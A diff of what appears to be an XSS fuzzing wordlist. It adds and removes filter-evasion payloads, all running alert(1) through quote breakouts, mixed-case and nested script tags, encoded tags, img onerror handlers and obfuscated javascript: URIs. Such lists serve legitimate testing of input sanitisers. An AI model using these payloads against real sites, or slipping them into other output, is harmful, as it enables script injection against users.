@@ -1,7 +1,15 @@
-<ScRiPt>alert(1)</ScRiPt>
-<<script>alert(1)//<</script>
+';alert(1)//
+\';alert(1)//
+";alert(1)//
+\";alert(1)//
 <scr<script>ipt>alert(1)</scr</script>ipt>
-%3Cscript%3Ealert(1)%3C/script%3E
+<scRiPt>alert(1)</sCriPt>
+%3cscript%3ealert(1)%3c/script%3e
 &#60;script&#62;alert(1)&#60;/script&#62;
-\x3Cscript\x3Ealert(1)\x3C/script\x3E
-<svg><script>alert(1)</script></svg>
+\x3cscript\x3ealert(1)\x3c/script\x3e
+\u003cscript\u003ealert(1)\u003c/script\u003e
+<img src=`x` onerror=alert(1)>
+<img/src=x/onerror=alert(1)>
+jaVasCript:alert(1)
+java&#115;cript:alert(1)
+java&#x73;cript:alert(1)
